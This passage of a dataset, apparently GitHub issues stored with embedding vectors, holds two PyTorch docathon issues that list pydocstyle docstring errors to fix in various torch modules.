 -0.24184626  0.31293187  0.12650594 -0.01158459  0.1951353  -0.17794427
  0.15137126 -0.07787716  0.10350379 -0.13490838  0.31367135  0.2495087
  0.39669016  0.11898056 -0.43162867  0.10852151 -0.25602734  0.13032362
  0.2917533   0.3133296   0.08439282 -0.0221676   0.07649712 -0.00597597
  0.12613103 -0.00335314  0.09275392 -0.24857792  0.2307496   0.08551917
 -0.12832317  0.16416287  0.18818246  0.05513149 -0.11484215 -0.2864043
  0.0519257  -0.16498178 -0.13700819 -0.5809399  -0.1172879  -0.17335172
  0.27844495  0.4687296  -0.31751576  0.4709835  -0.0852697   0.15360218
  0.06588909  0.06934837 -0.37878233  0.5194973  -0.05119789 -0.01434125
  0.61490345  0.16615933  0.02359268 -0.38756675 -0.03205177  0.1793019
 -0.17303506 -0.00855622 -0.3143322  -0.06004238 -0.22657815 -0.11448354
 -0.42279378 -0.18800811 -0.15881488  0.22025579 -0.1367198  -0.23215915
  0.08039369  0.13239953 -0.20075035 -0.4202425  -0.01772838  0.21050343
 -0.1909549   0.5339664  -0.10451438  0.04659652 -0.07501888  0.1453014
  0.12083884 -0.11181487  0.4204915   0.31943828 -0.10333913 -0.31484342
  0.20741306 -0.12981741 -0.08531427 -0.05950606  0.41193902  0.5656557
  0.24981894  0.29763955 -0.14852633  0.34163582  0.30360836 -0.115183
  0.43764406 -0.01684887 -0.3050803  -0.24440795 -0.08775886  0.07392716
 -0.3451628  -0.16004598  0.03961556 -0.21151476 -0.3134868   0.29032218
  0.19675392 -0.02639916  0.3322374  -0.40802014 -0.35975754 -0.0131023
 -0.19242868 -0.34476322  0.26898468  0.12761283 -0.07297081 -0.02886101
  0.00879299 -0.02319974 -0.0226051   0.00248362  0.52664316 -0.07776125
  0.05948438  0.07125469  0.13228336 -0.09169424  0.24897943  0.36395678
 -0.20155501  0.09099399 -0.07526322 -0.02902414  0.09104997 -0.40556937
 -0.29744583 -0.01403045 -0.46486723  0.15844777 -0.15837567 -0.4893506
  0.27931038  0.02405462  0.47684094  0.10728601 -0.46040368 -0.00334385
  0.03800084  0.12292621 -0.10151504  0.14330624 -0.0292812   0.24248534
  0.23198226 -0.1566094  -0.17797564  0.1893204   0.08591929 -0.19501388
  0.08842735 -0.48339647  0.49091095  0.12512136  0.5007601  -0.05234447
  0.37812942 -0.08291845  0.09148838  0.07611325 -0.08366159  0.45585275
 -0.2634838  -0.10696425  0.37277567  0.04008517 -0.10177162 -0.16246781
 -0.5960637  -0.08386687 -0.15262586  0.06011187  0.40701962 -0.08995596
 -0.07067645  0.14296359 -0.01034027  0.09429529  0.30891696  0.18007737
 -0.54649675 -0.04571256 -0.03958904  0.26419705  0.15759693  0.18680769
  0.05586759  0.12613255 -0.04711301 -0.3849963   0.38442674  0.34789053
 -0.3867793   0.06924012  0.09353713 -0.06019332  0.07012124  0.59731436
  0.4040172  -0.09153362 -0.18158546 -0.42150575 -0.23661886  0.0906125
  0.07238576 -0.02823313 -0.28106576  0.10678448 -0.10888355 -0.39486575
  0.10478513  0.08080449 -0.00867028 -0.15705663 -0.07992727  0.17109138
 -0.18347622  0.12365835  0.06964032 -0.35605696  0.01270134 -0.12719838
  0.20071468 -0.5626117  -0.14443022 -0.10871117  0.05756667  0.41694137
 -0.31084543 -0.4787432   0.629014   -0.28030735 -0.3420017   0.029321
 -0.10746366  0.3473199  -0.02607483  0.06528115  0.0265256   0.4173023
 -0.57188034 -0.04282438 -0.24531    -0.41413057 -0.08097227 -0.3165099
 -0.24838182  0.189367    0.07115008 -0.23448446 -0.39344752  0.02649714
 -0.15494907  0.23649827  0.40962836  0.35868782  0.2435453   0.02098707
  0.21751045 -0.319899   -0.47303927  0.46701667  0.36979544 -0.32339132]"
"Fix docstring errors in throughput_benchmark.py, weak.py, _traceback.py, file_baton.py, _contextlib.py, _device.py, cpp_backtrace.py, bundled_inputs.py, run_cpu.py, hooks.py, mobile_optimizer.py, _freeze.py, __init__.py, mkldnn.py, dlpack.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_built`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_built`, **Line**: 9, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_built`, **Line**: 9, **Description**: First line should end with a period (not 's')
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_built`, **Line**: 9, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_available`, **Line**: 18, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_macos13_or_newer`, **Line**: 24, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `_init`, **Line**: 30, **Description**: First line should end with a period (not 'm')
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `_CPUinfo`, **Line**: 142, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `_CPUinfo`, **Line**: 142, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `numa_aware_check`, **Line**: 224, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `_Launcher`, **Line**: 243, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `_Launcher`, **Line**: 243, **Description**: Docstring is over-indented
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `_Launcher`, **Line**: 243, **Description**: First line should end with a period (not 'r')
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `add_lib_preload`, **Line**: 255, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `add_lib_preload`, **Line**: 255, **Description**: First line should end with a period (not 'P')
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `set_memory_allocator`, **Line**: 298, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `set_multi_thread_and_allocator`, **Line**: 363, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `create_args`, **Line**: 617, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `create_args`, **Line**: 617, **Description**: First line should end with a period (not 's')
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `create_args`, **Line**: 617, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/backends/opt_einsum/__init__.py`, **Entity**: `is_available`, **Line**: 16, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/opt_einsum/__init__.py`, **Entity**: `get_opt_einsum`, **Line**: 21, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/cpu/__init__.py`, **Entity**: `get_cpu_capability`, **Line**: 7, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/cpp_backtrace.py`, **Entity**: `get_cpp_backtrace`, **Line**: 4, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/utils/cpp_backtrace.py`, **Entity**: `get_cpp_backtrace`, **Line**: 4, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/cpp_backtrace.py`, **Entity**: `get_cpp_backtrace`, **Line**: 4, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/_contextlib.py`, **Entity**: `context_decorator`, **Line**: 70, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/utils/_contextlib.py`, **Entity**: `context_decorator`, **Line**: 70, **Description**: First line should end with a period (not '
- **File**: `torch/utils/_contextlib.py`, **Entity**: `_DecoratorContextManager`, **Line**: 121, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/_device.py`, **Entity**: `set_device`, **Line**: 83, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_device.py`, **Entity**: `set_device`, **Line**: 83, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/_device.py`, **Entity**: `set_device`, **Line**: 83, **Description**: First line should be in imperative mood (perhaps 'Decorate', not 'Decorator')
- **File**: `torch/utils/_freeze.py`, **Entity**: `write_bytecode`, **Line**: 119, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_freeze.py`, **Entity**: `write_bytecode`, **Line**: 119, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/_freeze.py`, **Entity**: `write_main`, **Line**: 135, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_freeze.py`, **Entity**: `write_main`, **Line**: 135, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/_freeze.py`, **Entity**: `write_frozen`, **Line**: 153, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/_freeze.py`, **Entity**: `compile_path`, **Line**: 164, **Description**: First line should be in imperative mood; try rephrasing (found 'Generic')
- **File**: `torch/utils/_freeze.py`, **Entity**: `compile_file`, **Line**: 222, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_freeze.py`, **Entity**: `compile_file`, **Line**: 222, **Description**: First line should end with a period (not 'o')
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `InflatableArg`, **Line**: 14, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `InflatableArg`, **Line**: 14, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `bundle_inputs`, **Line**: 45, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `bundle_inputs`, **Line**: 45, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `bundle_inputs`, **Line**: 45, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `augment_model_with_bundled_inputs`, **Line**: 132, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `augment_model_with_bundled_inputs`, **Line**: 132, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/utils/dlpack.py`, **Entity**: `from_dlpack`, **Line**: 50, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/dlpack.py`, **Entity**: `from_dlpack`, **Line**: 50, **Description**: First line should not be the function's ""signature""
- **File**: `torch/utils/file_baton.py`, **Entity**: `FileBaton`, **Line**: 6, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/file_baton.py`, **Entity**: `__init__`, **Line**: 9, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/file_baton.py`, **Entity**: `__init__`, **Line**: 9, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/file_baton.py`, **Entity**: `try_acquire`, **Line**: 22, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/file_baton.py`, **Entity**: `try_acquire`, **Line**: 22, **Description**: First line should be in imperative mood (perhaps 'Try', not 'Tries')
- **File**: `torch/utils/file_baton.py`, **Entity**: `wait`, **Line**: 35, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/file_baton.py`, **Entity**: `release`, **Line**: 45, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/hooks.py`, **Entity**: `unserializable_hook`, **Line**: 73, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/hooks.py`, **Entity**: `unserializable_hook`, **Line**: 73, **Description**: First line should be in imperative mood (perhaps 'Decorate', not 'Decorator')
- **File**: `torch/utils/hooks.py`, **Entity**: `BackwardHook`, **Line**: 93, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/mkldnn.py`, **Entity**: `_MkldnnConvNd`, **Line**: 37, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/mkldnn.py`, **Entity**: `_MkldnnConvNd`, **Line**: 37, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/mobile_optimizer.py`, **Entity**: ``, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/mobile_optimizer.py`, **Entity**: `optimize_for_mobile`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/mobile_optimizer.py`, **Entity**: `optimize_for_mobile`, **Line**: 21, **Description**: First line should end with a period (not '
- **File**: `torch/utils/mobile_optimizer.py`, **Entity**: `generate_mobile_module_lints`, **Line**: 80, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/mobile_optimizer.py`, **Entity**: `generate_mobile_module_lints`, **Line**: 80, **Description**: First line should end with a period (not '
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `format_time`, **Line**: 6, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `format_time`, **Line**: 6, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `format_time`, **Line**: 6, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `iters_per_second`, **Line**: 42, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `iters_per_second`, **Line**: 42, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `iters_per_second`, **Line**: 42, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `ThroughputBenchmark`, **Line**: 62, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `ThroughputBenchmark`, **Line**: 62, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `ThroughputBenchmark`, **Line**: 62, **Description**: First line should end with a period (not 'k')
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `run_once`, **Line**: 103, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `run_once`, **Line**: 103, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `add_input`, **Line**: 112, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `add_input`, **Line**: 112, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `add_input`, **Line**: 112, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `benchmark`, **Line**: 126, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `benchmark`, **Line**: 126, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `benchmark`, **Line**: 126, **Description**: First line should end with a period (not '
- **File**: `torch/utils/weak.py`, **Entity**: `TensorWeakRef`, **Line**: 273, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/weak.py`, **Entity**: `TensorWeakRef`, **Line**: 273, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/_traceback.py`, **Entity**: `shorten_filename`, **Line**: 133, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_traceback.py`, **Entity**: `shorten_filename`, **Line**: 133, **Description**: First line should end with a period (not '/')
- **File**: `torch/utils/_traceback.py`, **Entity**: `format_frame`, **Line**: 142, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_traceback.py`, **Entity**: `format_frame`, **Line**: 142, **Description**: First line should end with a period (not 'h')
- **File**: `torch/utils/_traceback.py`, **Entity**: `format_traceback_short`, **Line**: 149, **Description**: One-line docstring should fit on one line with quotes (found 3)

cc @carljparker",False,"[-0.285448   -0.35281157 -0.18546788 -0.22262928  0.14757958 -0.02503927
 -0.17477304  0.29955006 -0.41685683  0.08197649  0.06739662 -0.07018526
  0.16956982  0.05193499 -0.12607545  0.26278645 -0.14480105 -0.14488348
  0.26428396  0.1889764   0.1079757   0.34185147 -0.03247129  0.1518389
 -0.24955958  0.07250862 -0.39423698 -0.31059542 -0.09628573  0.07130538
  0.43572545  0.05198368 -0.24859762  0.07189992  0.6039095   0.3722509
  0.01837181 -0.29635265 -0.06009515  0.01988708  0.01946257  0.07424754
 -0.16546394  0.08005291  0.15705165 -0.25397584 -0.36783367  0.28819627
 -0.22215202  0.29050493 -0.18258744  0.08674677 -0.74379987 -0.13274646
  0.04459208 -0.01820818 -0.04497714  0.70470464  0.15908942 -0.08399411
  0.1469799  -0.12871991  0.08064549  0.27599096  0.08493142  0.25013945
  0.12823859  0.1425558   0.379766   -0.16910207 -0.27301782  0.02821872
 -0.45033383 -0.1853747   0.21506251  0.21882683 -0.3874629  -0.06304954
 -0.32825392 -0.21615726 -0.2032614  -0.18451259  0.13947928  0.07683186
  0.15124248 -0.10132456  0.3452287  -0.22224075  0.09143961  0.05535484
  0.35268873 -0.11152539 -0.02572431  0.49480763  0.10971349  0.19516471
  0.11186057 -0.02959441 -0.00354756 -0.00193209  0.09418119 -0.38135743
 -0.11801256  0.21950169  0.05877504 -0.0722622   0.18299925 -0.19442281
  0.20622696  0.07628006  0.08688594 -0.02995931  0.11375853  0.06556047
  0.24510269 -0.01885081 -0.43515146 -0.03673935 -0.414892    0.19221182
  0.24404703  0.28459853  0.0831688   0.0102183   0.11885055 -0.01570458
  0.35435128 -0.06796378  0.1608065  -0.39138973  0.373394   -0.113315
 -0.06888568  0.03048594 -0.01922482 -0.00339832 -0.2658514  -0.4383195
 -0.3114863  -0.25875193 -0.44641122 -0.18730289 -0.13217916 -0.23509067
  0.292924    0.46041802 -0.36792493  0.47728634  0.03939062  0.01200679
  0.13099812 -0.02213568 -0.22677776  0.24404848  0.16751266  0.25211933
  0.6529405   0.0981497  -0.19801071 -0.5438398  -0.05608828  0.1434799
 -0.07467824 -0.21655726 -0.12497631 -0.06024759 -0.09084443  0.07681154
 -0.5928122  -0.04130105 -0.01916404  0.23819283 -0.11763572 -0.05847636
  0.16020799  0.1602664  -0.44519287 -0.37306288 -0.15940924  0.10611112
 -0.0162544   0.18918768 -0.00115115 -0.1618472  -0.15971813  0.1927863
  0.19118169  0.12662356  0.2766372   0.15904562  0.06464634 -0.41301027
  0.28581068  0.06978883 -0.12699585 -0.08929956  0.46726036  0.512233
  0.14542376  0.24450451 -0.10193391  0.29523075  0.37426552  0.02060509
  0.5790726  -0.01687716 -0.2760237  -0.25983557 -0.25631616  0.13004586
 -0.49272907 -0.11463355 -0.15937407 -0.40652773 -0.39345306  0.1800361
  0.14922823 -0.11548518  0.09527741 -0.16757894 -0.24882442 -0.09129575
 -0.22815219 -0.30806386  0.35089123  0.09316915 -0.05249795  0.22176158
 -0.17879228  0.05719527 -0.10658925  0.04542726  0.8299075  -0.04580073
  0.24023752  0.04083955 -0.0602924  -0.2960297   0.16659142  0.31633854
 -0.24724475  0.14641237 -0.00898385 -0.04243815  0.29939127 -0.49518314
 -0.21899872 -0.04298469 -0.30088562  0.17324683 -0.4954957  -0.48812896
  0.15769422  0.01735267  0.5660362   0.41783077 -0.5427698  -0.23030144
  0.11951344  0.23156883  0.01277306  0.16182876 -0.16162837  0.28246212
  0.57394385  0.04525809 -0.42802262 -0.05079516  0.30310532 -0.165627
  0.18768527 -0.61005616  0.3285492   0.13527656  0.5144205   0.22256696
  0.44941756 -0.07779832 -0.17657141  0.22597203 -0.22662506  0.28337353
 -0.33591962 -0.06352086  0.29086393 -0.20122704 -0.12505914 -0.2550295
 -0.48249114 -0.32292122  0.00138868 -0.03795754  0.5007982   0.0404325
 -0.07563239  0.06726367  0.04064205  0.27900964  0.20953086 -0.07175479
 -0.5534607  -0.09607071 -0.13994692  0.32107577  0.33926547  0.29050648
  0.2595812   0.28597435  0.1263552  -0.30550015  0.30992147  0.32844728
 -0.41983312  0.05469071 -0.20379126 -0.04849209  0.04719663  0.68164957
  0.21565479 -0.01121293  0.01054951 -0.4377581  -0.11553059  0.1789487
  0.04586822 -0.1347406  -0.46457642  0.15819259 -0.05745774 -0.25855753
  0.14905247  0.1511956  -0.24526675 -0.00824512 -0.04108147  0.24130717
 -0.28178704  0.24446869  0.06950194 -0.44786733  0.13542211  0.00637496
  0.15866424 -0.48300242 -0.00634673 -0.20031759  0.19877633  0.49455994
 -0.2090053  -0.26836795  0.54385793 -0.14450765 -0.30840528 -0.0734451
 -0.22243476  0.359563    0.01733367  0.2294394  -0.05412121  0.5398493
 -0.49028727 -0.14376748 -0.3674197  -0.5928219   0.00263922 -0.23324886
  0.02596547  0.17398106 -0.00564289  0.07271003 -0.26445758  0.13208881
 -0.28535828  0.20983659  0.18294658  0.15589249  0.1430813   0.0785777
  0.01610436 -0.23832873 -0.35652953  0.25704566  0.42182928 -0.25630522]"
"Fix docstring errors in expanded_weights_utils.py, linear_fused.py, prepare.py, serializer.py, utils.py, batchnorm.py, functional_modules.py, conv_utils.py, linear_relu.py, activation.py, conv.py, normalization.py, dropout.py, linear.py, functional.py, convert_parameters.py, __init__.py, embedding_ops.py, conv_fused.py, sparse.py, rnn.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `parameters_to_vector`, **Line**: 6, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `vector_to_parameters`, **Line**: 28, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `_check_param_device`, **Line**: 58, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `_check_param_device`, **Line**: 58, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `_check_param_device`, **Line**: 58, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `_check_param_device`, **Line**: 58, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `PackedSequence`, **Line**: 28, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `to`, **Line**: 119, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `to`, **Line**: 119, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `is_cuda`, **Line**: 146, **Description**: First line should end with a period (not 'u')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `is_pinned`, **Line**: 150, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `is_pinned`, **Line**: 150, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `pad_packed_sequence`, **Line**: 274, **Description**: First line should be in imperative mood (perhaps 'Pad', not 'Pads')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `pad_sequence`, **Line**: 347, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `pad_sequence`, **Line**: 347, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `unpad_sequence`, **Line**: 408, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `unpad_sequence`, **Line**: 408, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `pack_sequence`, **Line**: 454, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `unpack_sequence`, **Line**: 490, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `unpack_sequence`, **Line**: 490, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `standard_kwargs`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `standard_kwargs`, **Line**: 19, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `standard_kwargs`, **Line**: 19, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `forward_helper`, **Line**: 28, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `forward_helper`, **Line**: 28, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `forward_helper`, **Line**: 28, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `sum_over_all_but_batch_and_last_n`, **Line**: 123, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `sum_over_all_but_batch_and_last_n`, **Line**: 123, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `sum_over_all_but_batch_and_last_n`, **Line**: 123, **Description**: First line should be in imperative mood (perhaps 'Calculate', not 'Calculates')
- **File**: `torch/nn/utils/_expanded_weights/conv_utils.py`, **Entity**: `unfold3d`, **Line**: 189, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/_expanded_weights/conv_utils.py`, **Entity**: `unfold3d`, **Line**: 189, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_expanded_weights/conv_utils.py`, **Entity**: `unfold3d`, **Line**: 189, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **File**: `torch/nn/quantized/functional.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/quantized/modules/activation.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/batchnorm.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/conv.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/dropout.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/embedding_ops.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/functional_modules.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/linear.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/normalization.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/rnn.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/utils.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/dynamic/modules/__init__.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/dynamic/modules/conv.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/dynamic/modules/linear.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/dynamic/modules/rnn.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/_reference/modules/__init__.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/_reference/modules/conv.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/_reference/modules/linear.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/_reference/modules/rnn.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
